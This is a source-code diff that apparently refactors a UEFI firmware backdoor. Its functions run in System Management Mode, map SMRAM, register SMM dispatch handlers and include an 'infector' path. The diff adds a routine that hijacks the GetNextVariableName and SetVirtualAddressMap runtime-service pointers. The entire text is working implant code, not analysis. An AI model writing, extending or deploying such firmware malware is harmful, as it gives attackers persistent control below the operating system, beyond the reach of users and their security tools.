@@ -193,36 +193,6 @@ void ConsoleClearBuffer(void)
     }
 }
 //--------------------------------------------------------------------------------------
-VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
-{
-    EFI_STATUS Status = EFI_SUCCESS;
-
-    if (m_TextOutput == NULL)
-    {
-        // initialize console I/O
-        Status = m_BS->HandleProtocol(
-            m_ST->ConsoleOutHandle,
-            &gEfiSimpleTextOutProtocolGuid, 
-            (VOID **)&m_TextOutput
-        );
-        if (Status == EFI_SUCCESS)
-        {
-            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
-            m_TextOutput->ClearScreen(m_TextOutput);
-
-            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Ready\r\n");
-
-            if (m_OutputBuffer)
-            {
-                // print pending messages
-                ConsolePrintScreen(m_OutputBuffer);
-
-                m_BS->Stall(TO_MICROSECONDS(3));
-            }            
-        }        
-    }        
-}
-//--------------------------------------------------------------------------------------
 VOID *ImageBaseByAddress(VOID *Addr)
 {
     UINTN Offset = 0;
@@ -316,6 +286,48 @@ EFI_STATUS RegisterProtocolNotifyDxe(
     DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);
 
     return Status;
+}
+//--------------------------------------------------------------------------------------
+VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+
+    if (m_TextOutput == NULL)
+    {
+        // initialize console I/O
+        Status = m_BS->HandleProtocol(
+            m_ST->ConsoleOutHandle,
+            &gEfiSimpleTextOutProtocolGuid,
+            (VOID **)&m_TextOutput
+        );
+        if (Status == EFI_SUCCESS)
+        {
+            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
+            m_TextOutput->ClearScreen(m_TextOutput);
+
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Ready\r\n");
+
+            if (m_OutputBuffer)
+            {
+                // print pending messages
+                ConsolePrintScreen(m_OutputBuffer);
+
+                m_BS->Stall(TO_MICROSECONDS(3));
+            }
+        }
+    }
+}
+
+VOID SimpleTextOutProtocolNotifyRegister(VOID)
+{
+    VOID *Registration = NULL;
+    EFI_EVENT Event = NULL;
+
+    // set text output protocol register notify
+    RegisterProtocolNotifyDxe(
+        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
+        &Event, &Registration
+    );
 }
 //--------------------------------------------------------------------------------------
 #ifdef USE_PERIODIC_TIMER
@@ -1459,6 +1471,14 @@ VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
     DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n"); 
     DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", Smst);            
 
+    if (m_SmramMapSize > 0)
+    {
+        /*
+            Use beginnig of the SMRAM as dummy page for VirtualAddrRemap()
+        */
+        m_DummyPage = m_SmramMap[0].PhysicalStart;
+    }
+
     // allocate temp buffer
     Status = m_Smst->SmmAllocatePages(
         AllocateAnyPages,
@@ -1466,12 +1486,12 @@ VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
         1, &Addr
     );
     if (Status == EFI_SUCCESS)
-    {                 
+    {
         m_TempBuff = (UINT8 *)Addr;
     }
 
     Status = m_Smst->SmmLocateProtocol(
-        &gEfiSmmSwDispatch2ProtocolGuid, NULL, 
+        &gEfiSmmSwDispatch2ProtocolGuid, NULL,
         &SwDispatch
     );
     if (Status == EFI_SUCCESS)
@@ -1489,10 +1509,10 @@ VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
             &gEfiSmmSwDispatch2ProtocolGuid,
             SwDispatch2Notify,
             &Registration
-        );    
+        );
     }
 
-#ifdef USE_PERIODIC_TIMER    
+#ifdef USE_PERIODIC_TIMER
 
     Status = m_Smst->SmmLocateProtocol(
         &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
@@ -1630,21 +1650,8 @@ EFI_STATUS EFIAPI new_SetVirtualAddressMap(
     return Func(MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap);
 }
 
-#endif // USE_PERIODIC_TIMER  
-
-VOID BackdoorResidentCommon(VOID *Image)
+VOID BackdoorInitRuntimeHooks(VOID)
 {
-    VOID *Registration = NULL;
-    EFI_EVENT Event = NULL;  
-    EFI_STATUS Status = EFI_SUCCESS;
-    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;
-    UINTN i = 0;
-    
-    // update image base address
-    m_ImageBase = Image;         
-
-#ifdef USE_PERIODIC_TIMER   
-
     // hook GetNextVariableName() runtime function
     old_GetNextVariableName = m_RT->GetNextVariableName;
     m_RT->GetNextVariableName = new_GetNextVariableName;
@@ -1652,14 +1659,18 @@ VOID BackdoorResidentCommon(VOID *Image)
     // hook SetVirtualAddressMap() runtime function
     old_SetVirtualAddressMap = m_RT->SetVirtualAddressMap;
     m_RT->SetVirtualAddressMap = new_SetVirtualAddressMap;
+}
 
 #endif // USE_PERIODIC_TIMER
 
-    // set text output protocol register notify
-    RegisterProtocolNotifyDxe(
-        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
-        &Event, &Registration
-    );    
+VOID BackdoorResidentCommon(VOID *Image)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;
+    UINTN i = 0;
+
+    // update image base address
+    m_ImageBase = Image;
 
     // locate SMM access 2 protocol
     if ((Status = m_BS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
@@ -1679,15 +1690,7 @@ VOID BackdoorResidentCommon(VOID *Image)
                     m_SmramMap[i].PhysicalStart,
                     m_SmramMap[i].PhysicalStart + m_SmramMap[i].PhysicalSize - 1
                 );
-            }
-
-            if (m_SmramMapSize > 0)
-            {
-                /*
-                    Use beginnig of the SMRAM as dummy page for VirtualAddrRemap()
-                */
-                m_DummyPage = m_SmramMap[0].PhysicalStart;
-            }
+            }            
         }
         else
         {
@@ -1748,6 +1751,16 @@ VOID BackdoorResidentDma(VOID *Image)
     // perform common initialization
     BackdoorResidentCommon(Image);
 
+    // for debug messages output on the screen
+    SimpleTextOutProtocolNotifyRegister();
+
+#ifdef USE_PERIODIC_TIMER
+
+    // install hooks to enable periodic timer during RT phase
+    BackdoorInitRuntimeHooks();
+
+#endif
+
     // report sucessfully executed DXE driver
     Status->Success += 1;
 
@@ -1786,7 +1799,18 @@ VOID BackdoorResidentInfector(VOID *Image)
             {
                 DbgMsg(__FILE__, __LINE__, "GetSmstLocation() ERROR 0x%x\r\n", Status);
             }
-        }                
+        }
+        else
+        {
+            // for debug messages output on the screen
+            SimpleTextOutProtocolNotifyRegister();
+
+#ifdef USE_PERIODIC_TIMER
+
+            // install hooks to enable periodic timer during RT phase
+            BackdoorInitRuntimeHooks();
+#endif
+        }
     }
     else
     {
